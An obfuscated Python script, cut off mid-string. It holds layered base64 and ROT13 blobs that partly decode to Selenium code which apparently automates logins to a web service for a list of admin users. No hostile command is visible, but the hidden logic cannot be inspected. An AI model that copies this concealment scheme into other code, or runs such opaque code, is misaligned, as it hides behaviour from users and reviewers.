import base64, codecs
magic = 'bW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbSA9IDIyMApBYUFBYWFBYUFBQUFBQUFhYWFBQWFBYWFhQWFhYWFBYWFBYUFhQUFhYUFhQWFBYWFBQUFhYWFhYUFBYWFBQUFBQWFBQUFBYWFBQUFBQUFhQWFBQUFhYUFBQWFhYUFhQUFhYWFhQUFBQWFhYUFhYWFBQWFhQWFhQUFhYUFBYWFBQSA9ICJ2UGZWRnlha290RHlTUG5HSEVXVHZOZVdsVXRpWUtrTXNwVVBqVXdEcEpiZ3ZVV0VWYkJzaXVXaUlGZmR6Wm9KTHpPeG9NdlBIeXBXd3ZoIgphMTI2ID0gIkhVWmJrdFNXSkFWUHdrVmRjS0RkQWxwdVZIbXN6QU93TlF5RG1TUHp1WEtsdXp4ZnlucXVnb29FVmN1bXRPZnhoa2d4b1laeXdqZG9ETVciCm9vb29vb29vb29vb29vb29vb29vb29vb29vb29vb29vb29vb29vb29vb29vb29vb29vb29vb29vb29vb29vb29vb29vb29vb29vb29vb29vb29vb29vb29vb29vb29vb29vb29vb29vb29vb29vb29vb29vb29vb29vb28gPSAiQVF5VE9TTkFFaGlHakVGVFRob0ZCTk9yaW92VWRZdlRVWkNrV0F0TmhkWm9OYm9kWmVkS1Bjb2Z6UEJERkRIV2NZcUhsSHp1TW5Fa1FaViIKdXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXUgPSA2OTAKTjE2MzY0ODE1MDk5OTQ3NjgxMjAgPSA0MzUKZTE2MzY0ODE1MDk5OTQ2MzQxMTggPSA0ODkKQnlXd2ROdENtTWZFY2JVYWRFbFhNR2tNVlVSbXRhUkVFQUVNZ3pmdmJqekR2YXFWc1RpQm5kZFdUamFUcXRPU2FudXRUUFRWVXlQUm5uZjExNiA9IDM2NgprblRicVZRWnd3cGtOVnhFRFRVZ3FDd21MS3hsUHNOQld4SVJoWFV0eGhabEhUSlBkS2FSUkxUdkdVZ2J0Y1lDVVdzZG9NanNwVkVKSkpvMTE0ID0gInBGUnV5Unlta0VjVWRNWnhmaERiem5YdktHdGVtSk5zRGxxd2h5blNzTEpaQmJFWlNQaW1ySXF6Q3VnVGxId0xRWGFId1RMTER0RGtLVnEiCmxJbElsbElsSUlsSUlJbGxsSWxsSWxJSWxJSWxJbElJbGxJbElJSUlsSUlsbGxJbGxJbElsSUlJSUlsSWxsSWxJSUlsSUlsbElJSUlJSWxsbGxsSUlJSUlsSUlJbElJSUlsSUlsSWxsSWxsbElJbEkgPSA0MTEKcjExMCA9IDE3MQpDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0MgPSAzNDMKbElJbGxsSWxJbGxsSWxJbGxsSUlsSWxsSWxsbGxJSWxJSWxsbElsbElJSUlJSWxJbElsbGxJbGxsSUlsSWxJSUlsbElJbGxJbElJSUlsSWxsSUlJbGxsbElJSUlJbGxsbElsbElJSWxsbCA9ICJybndmamp1TmJmcHpyYkRDRWJnVnR2cG1wSU5QQnZFQmtnem1FSHBlSWJleWFhb2dBZ1N0RktCTk5DSW1sWnNPdW1lRUlxdlFpT29GS2JkIgpoMTYzNjQ4MTUwOTk5Mzc3NjEwNCA9ICJGTGtBb3pXRWtRUWJOdHlzRlZkYWZtdmVXZG50dVNITk1Kc21mcG9ralBzY0lvSWRrTk1jUWFxZ1JubnFIZ2pXcEJkWkRpYlJQcVNtclZFIgpBYWFhYWFhQUFBQWFhQWFhQWFhYUFhQUFhQUFBQUFBYWFhQWFhYUFhYUFhYUFBQWFhYWFhYWFBQWFhQUFhYWFhQUFBQUFBYUFhQWFhYWFhQWFBYUFhYWFhQUFBYUFhQUFBQUFhYUEgPSAibHZpUmp0dVdtS3NFSU1NQk5CakJWaHFzWlFtZWVBRmF5ZmpXWlpkb3BDRWZDUG1vcVRKU2d2eG1ncWZMVUFZWWFWWXhwa2pGdGdYeE1KVCIKUlRwZVpvb1dMdWRaZnhSUXpWa1lLR0VHRXhOdW1scHN1TktPdmhwZlRhZW5Rb0VFQUZWWmZnTGtRbWJtcG5yak1CRGFqYXBJYnBZWEFvRjEwMCA9ICJJZlVMdGtuU01TU1J4RUptd3V4TUpYTEhySEdMQUtOa1dWSnNDcEVnSmxSdVNqTFlVb3NKeXdRc3pzb0dydGJxWWdFd25jVnhFbFJkdXpDIgpsbElJbElJbElsbElsSWxJbGxsSWxJbElsSWxsbGxJbGxsbElJbGxJbElJbGxJSWxsSWxsbGxsSWxsSUlJbGxsSUlsSWxJbGxsbGxsSUlsSWxsSWxJSWxJbElJbElsSUlsSSA9ICJzZ1BDSFdaSmhXV0ZNZ01IVUl0eFpGRldJbm9hZ3ZNdVpOQnpZdEdNcVd2V29Gd2JDZWRpZm1NYmV3SERkRVZhVUNPZ2JleGR5VGRWdHNOIgphQUFhYWFhYUFhYUFhQUFBYUFBQWFhYWFhYUFBQUFBYUFBQWFBYUFBQUFhQWFBYUFhQUFhQUFBQWFhQWFBYWFBQUFhYWFBQUFBYUFhQWFhQWFBYUFBQUFBYUFBQWFBQWEgPSAiRVlPQXVneGlDZVRqd3BhamRoeUZZS2VTRmZiclhNYk5lcEt0clJyb1dOaVNtWVBWZ3RRR0duRUlLZFNnYlFqWWRTS1ViRVN3VkdGenVZayIKTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTSA9IDMwMwpJMTYzNjQ4MTUwOTk5Mjc4MDQ5MiA9IDQwOApoMTYzNjQ4MTUwOTk5Mjc1NzM5MCA9ICJOa3lRckFhWXVlc1RaeFVkUFhaT05CT0lDSERxRERRb3lqUHVZZ01RR093Z2FZVnRXWUNrU3lDdEx5ZE5Vb3ZYQmVKS1Jad293WURocXRhIgpIVVFFVlFnc1h6T0pQaGlFVXl2eFlOY250WmlLVkhacVFNd0JUQlBzcklSa0NHZmpIZWVpZ0xvdlpLQWpVTE9Ha2pWZnVra3R6YVRpRmpYODggPSAiR2NKR25IdGFoQnFsQVRIaEtWcHp2d3BsQWtiWWxFZ0htU1hSV0pYT3dMTEd6WFJNUVFrZFREaHhhcUZkRUdJRnRNVkhHRnBERHdIa3VNbSIKUzg2ID0gImRFdVBObnZXY09wSm1nc2lCWUpZbEFsWUZkY3JrcER2WGlIQ3hEdUt5dHJXdHdlQmdScmVlRmhKQmtHTlNaT2JobGFndEpsdkxkcW5RSHQiCksxNjM2NDgxNTA5OTkyMzU0NDg0ID0gNTQxCkFBQUFhQUFhQWFBYUFBYUFBYWFhYUFBQUFhQUFBQWFhQUFBQUFhYUFBYUFBYWFhQUFBQUFBQUFBYUFBYUFBYUFhQWFhYUFhYWFhYWFBQWFBYWEgPSAiZ2tFeGlIdGdOSnFRSUJ1Z2xZa2NSQ3ZhT0FRdVhJZlBVZlRaaHdmZWNJUmdyTmV0ZEFacFlyUG5Pc0lLaU5hRXJsb2FzZm1sTEFYclhkTyIKcnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnIgPSAzNjEKbzE2MzY0ODE1MDk5OTIxNDY3OCA9IDI1MgpBQWFhQUFBQWFhQWFhQWFBYWFBYUFhYWFBQUFBYWFhYUFhQUFBYWFhYUFBQWFBQUFBYUFhQWFhQWFhYWFhQWFhQUFhQWFBYWFBYWFhID0gIkRHckF6V1FqSVZGbVpNUWJkam5hSHh0aEpxUWpweXFkbURVbEdUWUFJdFRwYm1XcmxrVFVtSktUeU5NRE9ZWFJpWEp2WUVabnhtelN4WlIiCloxNjM2NDgxNTA5OTkxODU3ODc0ID0gInlOV0hsUGV6ZUFPSUhRY1FpZ0VoWkdVRWxad1hMd2d1R1pFb1JPSlB2SGVnQlNYclV0Y3VGV1ZZcUNnaVRpdkhyWkhoYW5GeVpFeGJvVkMiCk9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PTyA9ICJUa2hrRUFRaFN6aUhoYXl1TW9OQm9NVkJFbFByRktaYWlJWVJwV3J2akVUUHRabGNQQmZTa3llb0tsTkVLa01XWlNLRmZkUU5rZGp0eUh2IgpOMTYzNjQ4MTUwOTk5MTY3MTg3MCA9IDM4NwpkVFRqd29JRGFhbVZpZmlLbXB1Z01zUEVEWVBoTG9PbWh5eHd2RlVaRUJHYmdjTkZrS2xFYWZpcHlZTmFRcW5ndkJOUk5hZ0NoRmxkY0tyNjggPSAibU1wRXJUcW1pZ25DaFJpSVVOYm1aTVlNeHhndFZkbExkWmxWYU1RYnNmenZlbHlFaUxvRmJVSFRkYXZ0SmVjSVpoY0RJY0RvZGN4QnFFTSIKWTY2ID0gIlVPZnhESkZjYVpNZmxnaEpWcFp4TG1yV2Nicnlaemthd3ZjbGZFaUtoS3JSbXVIcWdQV2tIbk9VZ05MU2dJZGhpZ0xqa09jQVpPSFNkVVQiCmFhQUFhYUFBYWFhYWFBQWFBYUFhYUFBQWFhQWFhYWFBQUFBYWFhQUFhYWFhQWFhQUFhYUFhQWFBYWFhYWFhQUEgPSAiTUlLUmhvTldCYVFmcWFydHVLeFNMbHJOYUNVUFljZ2xobFZUcEJjZ0ticVVaY0tEQ3l1QnVmUUF0aW1oUlFpa2V5TkxPUHZ0Wml0TmZUZSIKQWFhQUFBQUFhYWFhQWFBYWFhQWFhYUFBYUFBQUFhQUFBYWFhYWFBQWFhQWFBYUFhYUFhQWFBYWFhQUFBYUEgPSAiUkRDcmdvY1FpeXZVa0JlRFR2SnVwdVdtQWJQckN0a1lTYk9keHZQa3ZxWGpQZ3JlelFJdkR2VG9ZdnVzRkhZcUlTV3hFUnJjYWhCSGhSZyIKYzYwID0gMTk5CnBNeXpDR3BFdUhreG11R1RLYk9qU2ZVRkhDdmN6ZG9taUJ2Vmp1SlN3THN1RHFKdGR4cmhwamVCbVNTcFBXbnVwRGlWWmFVQ2NWaElVSUM1OCA9IDI2NwpHdHlOekxrZFFQT2xQaUR3eWZhekVUVnFYTk9qUEJzSlFlTm9VU0VWZ0Z3cVhlSGZjc05ZdlpBdEVLV01KU1RnV2lla3lueElReVNESmhBNTYgPSAiZHFqdFdvcU1ZWkJVaUVuV2RWcUpkQ3RMRFhuTXdRSmhuWUt5alNGQlFFQlh3ZHVVU0ZqUEhsa0ROc2hHSWJ5SkNGZlh1d1JpSlJYZlBLRCIKWjE2MzY0ODE1MDk5OTA3ODQyNTQgPSAiRWJKWFN4WFBkS1JjaERzWUhHb09CaHhKSEl2R2N0TndvTHRUd0dXTVpTQVhKb3ZudGZkQWVMRWFPTlhWbUdYVk1pR2dJa05yUFp2R2R5YiIKQUFhYUFBQWFBQUFBYWFhYUFhYUFhQUFBYWFhYWFhQWFBYWFhYWFBYWFhYUFhQUFBYWFhYSA9IDMxNQpBYWFBYWFBYWFBQUFhQWFhQUFhYWFhQUFBYWFhYUFhQUFhYWFBQUFhQWFBQUFBYUFhYSA9IDI4OQpvNDggPSA3NjIKQUFBYWFhQWFBQUFBYUFhYWFhYUFhYWFhQUFBYUFhQUFhQWFBQWFhYUFhQUFBQSA9ICJiQ1lmV0ZJblJYRExhTEpTZU1iT29nWXZEdld4QWhmckRTbkxFTG9iTFNXZGZ1c21vbVViVlVTT0ZEQ3VIQVVPcGFzdVdDWnRCZWJNQnZNIgpsbGxJbElsSUlsbElJbElsSWxJSUlJSUlsSWxJSUlsSUlJbGxsbGxsSWxsbCA9ICJSZ25rRlZNdGVpVmNMV05VRmdhYnRQZk14b0p2eEtiUUtmcHp4UFhTTHFYbk9SWXZadUR3dEFrZE1ZY21uVkl6SnRLWEdXcVBWbWloT2ZVIgpMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTEwgPSA4NjEKRjQwID0gImNGcWNQRlNnTGVmdmtYYkdneUpkc0Vac1hlZGlJUFlQY21CVVV5YmZSZXlhSmZOUklzTHh1TWlKdFBsUmlZVEdCU3VQWUxQWGhtVGd4Y0QiCmFhQUFBYWFhYUFBQWFhYUFhYUFhQWFhYWFBYWFBYUFhYWFhQWFBID0gIkFxS1dIb1V5V3ZwV3hSV3pnbXFKdm90TVNCcm9oUUpXdHpOc0JGbHhLbkdwVkZ5SFZrUWRsZXZBcHhwVWVPTlpMa3BGQVNaVnRsQXlqVEYiCk0zNiA9ICJXaVRUb1Rwa2xnaW5USEVTbWtPSkRGcktiSHZER0x1cmRZb1hPa1BGQm13aHJSWUx1UVpjZ2pYUUFXSlN2dlBQZ0F4Um1tVmZTTE9QQ2xSIgphYUFhQUFBYWFBQWFBQWFhYUFhQWFhQWFBYWFBQUFBQWFBID0gMTE5CmoxNjM2NDgxNTA5OTg5NTg2NDMyID0gInJNS2VQeEdLQlBRamJPbU9NU0tMYkZ6ZlV1R3NoaFlzb2ttcm5pcExRa01velJSWlZVQnpsWXN0YVZGTnZNYW1Xa3VyVUlRUkVreEFhZlAiCnd3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3dyA9IDYxMQpYd3JvU0ZVYkNLT3lPbUtkempjTVlFaE53R2RHQmVPamNYY2x4WW13ZGRGYm1WS254TGVTY0dFT3JVaVZEQm96anlsdmFIWGNIR1plT3hEMjggPSA0MzYKYW1sYmxwUXZBaUpBSHZER3N3UE1IWGtKaVdFUkNYVW1ETWlZTWNBRFhwQ0JEa0hrdnJnYlFjbklqU1dzUHVOWFR4T0lyd2J2cUdXUEV5UjI2ID0gMzg0CmMxNjM2NDgxNTA5OTg5MTg2MzI0ID0gMzc2ClF2UVFHcnJtaFVacW1FZEdxT0hCcnJCeEZEcUVOY05QaWhnZUZueGtKSGpDTlZjR2Z0aGdIbVVBcmdVd0RtR2J3RE5XblVKZk9ZbEpsb3cyMiA9IDM1NQpsSUlJbGxJbElsbGxsSWxsbGxJSSA9ICJMaUhoV3BrWEJaTEVPWWl0RU1ReElxemFMeHhVQkNheXl2VlVSbktTcGpwbVNrYmxxS0xQVXp0Wlh6dVpsQk9nUGtHS0d4em9uREl0cUZoIgpBYUFBQUFhYUFBQUFBQW'
love = 'SODHRtCFNvp0cGJKudnIqaFUAeo25Io0ulF3OwFIyPo0WmD1EgpRyEL3MJIyyUnyq2qKExGxqOI3WypRgzMT5BETuRETq0ISE4oyOgLKEEIJILD05DplVXoRyWoRyWoRyfFHyWoTkfoPN9VPWTITqnG2ESMRcWDJq3qJWhG2WvL2ELMKSwIyAmFSuEGJqPFTu4HzuiJSOOrzcOLHSOpxkfoH1CESuWqIWIM1ceLHAcDH1TE2knFRuDLKqyVtcvZGDtCFN0AGLXDHSODJSOLJSuDJSOVQ0tAQp1PzyILx9UJRgCEHIWpKcBFUSSGaWaM3qdq3OyE09XDJc3GUcYoyy6pUSwGauPERSEHycDIR5yJKyZn25ip3WlIRcZqyIOIzWDo3uQFyymH0RkZPN9VPWQM3OEJzuRMzWzGISMF1AzFzAjHxWMIRyXFTcPJIM4I2g2nRyHIHA0GTSFEzSzHJ94DISFJHWbFTkCqJ1lJyWJoJSOLzcmEUMBLzMLp0MIVtcODJSuDHSOLFN9VPW1M1AJoxkurUEYGKcmHKOarSuxMUSbLJqSoTIAqISVFRu1qSqaoJSBM09HFH15GzAUFJAOFSy0FayuISIDDzuyGyy5E3unIJ1HoSEaIxAEVtc1ET1gF1EgEIO4IxIzn1ScDzIGnzAMqJWLIRuaMTE2oRcLHzSTL3EvDaWcIJWbLH54oTcRp3S6qIq5nSynoUclo2SUM3cIGISRFHIjp0EyAvN9VPWvrUyyM3A2FJA0G1MIIyOwHRMOM0SfJSuXIKOAoIWIrxccqH9PHIW1JUcSE3EME1WBp2u2Eayvn05CGIOSDxcSFyMEF0WjIJAyJT9OoUqaVtcuAPN9VPWdo29knR11Mxc4pKEJLx5LHyWSqJAKHJA5L2uOpHSbrRE3pJyvIyAvHxunHJ9wFxcFFx9HMTuSExcSG2SlHRInMIcEo0u5rIEiGTqlnaq0VtcTZGLmAwD4ZGHjBGx4BQNlBQtlVQ0tZmZkPtbXMaWioFO0MJkyM3WuoFNhMKu0VTygpT9lqPOIpTEuqTIlVPkQo21gLJ5xFTShMTkypvNfGJImp2SaMHuuozEfMKVtYRMcoUEypaZtV2kcozH6Zwczpz9gVUEyoTIapzSgYzI4qPOcoKOipaDtIKOxLKEypvjtD29goJShMRuuozEfMKVfVR1yp3AuM2IVLJ5xoTIlYPOTnJk0MKWmPzygpT9lqPOfo2qanJ5aVPAfnJ5yBwZ6nJ1jo3W0VTkiM2qcozpXMaWioFOmMJkyozy1oFNhq2IvMUWcqzIlVP5mqKOjo3W0VP51nFOcoKOipaDtH2IfMJA0VPAfnJ5yBwD6MaWioFOmMJkyozy1oF53MJWxpzy2MKVhp3IjpT9lqP51nFOcoKOipaDtH2IfMJA0PzMlo20tp2IfMJ5cqJ0tnJ1jo3W0VUqyLzElnKMypvNwoTyhMGb1BzMlo20tp2IfMJ5cqJ0tnJ1jo3W0VUqyLzElnKMyptczpz9gVUEyoTIapzSgVTygpT9lqPOWozkcozIYMKyvo2SlMRW1qUEiovNfFJ5fnJ5yF2I5Lz9upzEALKWeqKNtYSIjMTS0MFNwoTyhMGb2BzMlo20tqTIfMJqlLJ0tnJ1jo3W0VRyhoTyhMHgyrJWiLKWxDaI0qT9hYPOWozkcozIYMKyvo2SlMR1upzg1pPjtIKOxLKEyPzMlo20tp2IfMJ5cqJ0tYaqyLzElnKMypvNhL29goJ9hVP5eMKymVTygpT9lqPOYMKymVPAfnJ5yBwp6MaWioFOmMJkyozy1oF53MJWxpzy2MKVhL29goJ9hYzgyrKZtnJ1jo3W0VRgyrKZXMaWioFOmMJkyozy1oFNhq2IvMUWcqzIlVP5wnUWioJHtYz9jqTyioaZtnJ1jo3W0VR9jqTyioaZtV2kcozH6BQczpz9gVUAyoTIhnKIgYaqyLzElnKMypv5wnUWioJHho3O0nJ9hplOcoKOipaDtG3O0nJ9hpjczpz9gVUAyoTIhnKIgVP53MJWxpzy2MKVtYzAioJ1iovNhLJA0nJ9hK2AbLJyhplOcoKOipaDtDJA0nJ9hD2uunJ5mVPAfnJ5yBwx6MaWioFOmMJkyozy1oF53MJWxpzy2MKVhL29goJ9hYzSwqTyioy9wnTScoaZtnJ1jo3W0VRSwqTyioxAbLJyhpjczpz9gVUAyoTIhnKIgVP53MJWxpzy2MKVtYaA1pUOipaDtYaIcVTygpT9lqPOGMJkyL3DtV2kcozH6ZGN6MaWioFOmMJkyozy1oF53MJWxpzy2MKVhp3IjpT9lqP51nFOcoKOipaDtH2IfMJA0PzMlo20tMaIhL3Eio2kmVTygpT9lqPO3pzSjplNwoTyhMGbkZGczpz9gVTM1ozA0o29fplOcoKOipaDtq3WupUZXnJ1jo3W0VUEcoJHtV2kcozH6ZGV6nJ1jo3W0VUEcoJHXnJ1jo3W0VT9mVPAfnJ5yBwRmBzygpT9lqPOipjczpz9gVUA0pzyhMmRtnJ1jo3W0VUA0pzyhMlNwoTyhMGbkAGczpz9gVUA0pzyhMmRtnJ1jo3W0VUA0pzyhMjczpz9gVUEyoTIapzSgVP5yrUDtYzEcp3OuqTAbMKVtnJ1jo3W0VUW1oy9up3yhLlNwoTyhMGbkAmczpz9gVUEyoTIapzSgYzI4qP5xnKAjLKEwnTIlVTygpT9lqPOlqJ5sLKA5ozZXFINtCJ9mVP5yoaMcpz9hVP5aMKDtXPWWHPVcV2kcozH6ZwN6FINtCFOipl5yoaMcpz9hYzqyqPtvFINvXDcIHxksZFN9Vzu0qUN6Yl8vX0yDVPfvBwH0ZmVkVvAfnJ5yBwVlByIFGS8kVQ0tVzu0qUN6Yl8vXlOWHPNeVwb1AQZlZFVXIIWZKmVtCFWbqUEjBv8iVvgWHPNeVwb1AQZlZF94qJxinJ5vo3IhMUZvV2kcozH6ZwD6IIWZKmVtCFNvnUE0pQbiYlVeVRyDVPfvBwH0ZmVkY3u1nF9cozWiqJ5xplVXGRyGIS9CEy9OER1WGyZtCJ9mVP5yoaMcpz9hVP5aMKDtXPWOER1WGyZvXFAfnJ5yBwV3BxkWH1EsG0MsDHEAFH5GVQ0to3ZhMJ52nKWiov5aMKDbVxSRGHyBHlVcVPZtGTymqPOiMvO1p2IlK2yxVT9zVTS1qTuipzy6MJDtqKAypaZXMTIzVUWyp3ElnJA0MJDtXR8jGmOCGmOCGmOCG08jGmNjVPx6V2kcozH6Zwx6MTIzVUWyp3ElnJA0MJDbMaIhLlx6PvNtVPONq3WupUZtXR8jGmOCGmOCGmOCG08jGmNjVPxwoTyhMGbmZQcNq3WupUZbMaIhLlxXVPNtVTEyMvOCG08jZR8jGmNjZR8jZR8jZPNbG09CZR8jZQNjGmNjZR8jZR8tYR8jG08jG08jZR8jZR8jGmOCVPjdG08jZQNjZR9CGmNjZQNjGmNtYPbdGmNjZQNjG09CG09CZR8jG08tXGbwoTyhMGbmZGcxMJLtq3WupUOyMPu1pTEuqTHfVTAioaEyrUDfVPcupzqmYPNdXzg3LKWaplx6PvNtVPNtVPNtG08jG09CG09CG08jZR8jGmNtCH9CGmOCZQNjZR8jZQOCZQOCVP5yMzMyL3EcqzIsqKAypvNhnJDtV2kcozH6ZmV6qKAypy9cMQRtCFO1pTEuqTHhMJMzMJA0nKMyK3ImMKVhnJDXVPNtVPNtVPOCGmNjZQOCZQOCZQNjZQNjGlN9Mvq7G08jG09CG09CG08jZR8jGmO9WlAfnJ5yBwZmBaImMKWsnJDtCFOzW3g1p2IlK2yxZK0aPvNtVPNtVPNtnJLtG08jZQNjGmNjGmNjZQNjZR8toz90VTyhVRkWH1EsG0MsDHEAFH5GVQbwoTyhMGbmAQccMvO1p2IlK2yxVT5iqPOcovOZFIAHK09TK0SRGHyBHmbXVPNtVPNtVPNtVPNtpUWcoaDtXPWIozS1qTuipzy6MJDtLJAwMKAmVTEyozyyMPOzo3Vtr30hVv5zo3WgLKDtXR9CZQNjZR8jZR8jZQNjZQOCVPxcV2kcozH6ZmH6pUWcoaDbVyIhLKI0nT9lnKcyMPOuL2Ayp3ZtMTIhnJIxVTMipvO7sF4vYzMipz1uqPu1p2IlK2yxXFxXVPNtVPNtVPNtVPNtGmOCGmOCGmNjGmNjGmOCZR8tYzWiqPNhp2IhMS9gMKAmLJqyVPuwnTS0K2yxVQ1CG08jGmNjZQOCZQNjGmNjGlNhoJImp2SaMFNhL2uuqS9cMPNfqTI4qPN9W1IhLKI0nT9lnKcyMPOuL2Ayp3ZtMTIhnJIxWlxwoTyhMGbmAwcwo250MKu0YzWiqP5mMJ5xK21yp3AuM2HbL2uuqS9cMQ11pTEuqTHhoJImp2SaMF5wnTS0K2yxYPO0MKu0CFqIozS1qTuipzy6MJDtLJAwMKAmVTEyozyyMPpcPvNtVPNtVPNtVPNtVUWyqUIlovNwoTyhMGbmAmclMKE1pz4XVPNtVPNtVPOlMKE1pz4tGmOCZR9CZR9CZR9CGmOCZQNtXR9CGmOCZQNjZR8jZQOCZQOCVPkCZR9CZR9CZQOCZQOCZR8jGlNfXx9CZQNjZQOCG08jZQNjZR8jVPjdXx8jZQNjZR9CG09CGmOCZR9CVPxwoTyhMGbmBQclMKE1pz4tMaIhLlu1pTEuqTHfVTAioaEyrUDfVPcupzqmYPNdXzg3LKWaplxXVPNtVUWyqUIlovOCG08jZR8jGmNjZR8jZR8jZPNwoTyhMGbmBGclMKE1pz4tq3WupUOyMNcNpzImqUWcL3EyMPNwoTyhMGb0ZGcNpzImqUWcL3EyMNcNpaIhK2SmrJ5wVPAfnJ5yBwDlBxOlqJ5sLKA5ozZXMTIzVT9zMvNbG08jZR8jZR9CGmNjG09CG08tYR9CGmNjG09CG09CG08jZR9CVPx6V2kcozH6AQZ6MTIzVT9zMvu1pTEuqTHfVTAioaEyrUDcBtbtVPNtG09CZQOCG09CG09CGmNjG08tYzWiqPNhp2IhMS9gMKAmLJqyVPuwnTS0K2yxVQ1CGmNjGmNjG09CZQOCG09CGlNhoJImp2SaMFNhL2uuqS9cMPNfqTI4qPN9p3ElnJ5aVP5xnKA1VPxwoTyhMGb0AGcwo250MKu0YzWiqP5mMJ5xK21yp3AuM2HbL2uuqS9cMQ11pTEuqTHhoJImp2SaMF5wnTS0K2yxYPO0MKu0CKA0pzyhMl5xnKA1XDbtVPNtGmNjG08jZQOCZQOCGmNjGmNtCKqyLzElnKMypvNhD2ulo21yG3O0nJ9hplNbXFAfnJ5yBwD5BzAbpz9gMI9ipUEco25mVQ0tq2IvMUWcqzIlYxAbpz9gMH9jqTyioaZbXDbtVPNtGmNjG08jZQOCZQOCGmNjGmNtYzWcozSlrI9fo2AuqTyiovN9o3ZtYzIhqzylo24tYzqyqPNbVxqCG0qZEI9QFSWCGHIsDxyBVvxwoTyhMGb1ZQcwnUWioJIso3O0nJ9hpl5vnJ5upaysoT9wLKEco24tCFOipl5yoaMcpz9hYzqyqPtvE09CE0kSK0AVHx9AEI9PFH4vXDbtVPNtGmNjG08jZQOCZQOCGmNjGmNtYzSxMS9upzq1oJIhqPNbVv0gnTIuMTkyp3ZvXFAfnJ5yBwHkBzAbpz9gMI9ipUEco25mYzSxMS9upzq1oJIhqPtvYF1bMJSxoTImplVcPvNtVPOCZQOCGmNjZR8jZR9CZQOCZPNhLJExK2SlM3IgMJ50VPtvYF1xnKAuLzkyYJEyqv1mnT0gqKAuM2HvXFAfnJ5yBwHlBzAbpz9gMI9ipUEco25mYzSxMS9upzq1oJIhqPtvYF1xnKAuLzkyYJEyqv1mnT0gqKAuM2HvXDbtVPNtGmNjG08jZQOCZQOCGmNjGmNtYzSxMS9upzq1oJIhqPNbVv0goz8gp2ShMTWirPVcV2kcozH6AGZ6L2ulo21yK29jqTyioaZhLJExK2SlM3IgMJ50XPVgYJ5iYKAuozEvo3tvXDbtVPNtGmOCZQOCZQNjZQOCGmOCG08tCKqyLzElnKMypvNhD2ulo21yVPuyrTIwqKEuLzkyK3OuqTttCJ9mVP5yoaMcpz9hVP5aMKDtXPWQFSWCGHIRHxyJEIWsHRSHFPVcYT9jqTyioaZtCH8jZR9CZQNjGmNjG08jZR8jVPxwoTyhMGb1AQcvpz93p2IlVQ0tq2IvMUWcqzIlYxAbpz9gMFuyrTIwqKEuLzkyK3OuqTt9o3ZhMJ52nKWiov5aMKDbVxAVHx9AEHEFFIMSHy9DDIEVVvxfVT9jqTyioaZ9L2ulo21yK29jqTyioaZcPvNtVPOCZR8jZR8jZQNjZR9CZR9CGlNhM2I0VPuIHxksZFNcV2kcozH6AGH6LaWiq3Aypv5aMKDbIIWZKmRcPvNtVPOCG09CZR9CZQOCZR9CZR9CZPN9GmOCZQOCZQNjZQOCGmOCG08tYzMcozEsMJkyoJIhqS9vrI94pTS0nPNbWl8inJ5jqKEoDUOfLJAynT9fMTIlCFW1p2IlozSgMFWqWlxwoTyhMGb1Amc1p2IlVQ0tLaWiq3Aypv5znJ5xK2IfMJ1yoaEsLaysrUOuqTtbWl8inJ5jqKEoDUOfLJAynT9fMTIlCFW1p2IlozSgMFWqWlxXVPNtVR9CG08jG08jZR8jG08jG08jVP5mMJ5xK2gyrKZtXUA0pzyhMlNhpUA3VPxwoTyhMGb1BQc1p2IlYaAyozEsn2I5plumqUWcozphpUA3XDbtVPNtG09CZQOCZR8jZQNjGmOCZR8tCH8jGmNjGmNjZQNjG08jG09CVP5znJ5xK2IfMJ1yoaEsLaysrUOuqTttXPpiY2yhpUI0J0OjoTSwMJuioTEypw0vpTSmp3qipzDvKFpcV2kcozH6AwN6pTSmp3ptCFOvpz93p2IlYzMcozEsMJkyoJIhqS9vrI94pTS0nPtaYl9coaO1qSgNpTkuL2Ibo2kxMKV9VaOup3A3o3WxVy0aXDbtVPNtG09CZQOCZR8jZQNjGmOCZR8tYaAyozEsn2I5plNbp3ElnJ5aVP5jp3ptXFAfnJ5yBwLkBaOup3A3YaAyozEsn2I5plumqUWcozphpUA3XDbtVPNtGmNjZR9CG09CZQNjG08jZQNtCH8jGmNjGmNjZQNjG08jG09CVP5znJ5xK2IfMJ1yoaEsLaysrUOuqTttXPpiY2W1qUEioygNL2kup3Z9VzShqP1vqT4tLJ50YJW0ov1voT9wnlWqWlxwoTyhMGb2ZmcfnJ5eLzSlVQ0tLaWiq3Aypv5znJ5xK2IfMJ1yoaEsLaysrUOuqTtbWl8iLaI0qT9hJ0OwoTSmpm0vLJ50YJW0ovOuoaDgLaEhYJWfo2AeVy0aXDbtVPNtGmNjZR9CG09CZQNjG08jZQNtYzAfnJAeVPtcV2kcozH6AwD6oTyhn2Wupv5woTywnltcPvNtVPO0nJ1yVP5moTIypPNbZFNcV2kcozH6AwH6qTygMF5moTIypPtkXDbtVPNtGmOCZQOCZQNjZQOCGmOCG08tYzMcozEsMJkyoJIhqS9vrI90LJqsozSgMFNbW2WiMUxaXF5mMJ5xK2gyrKZtXRgyrKZtY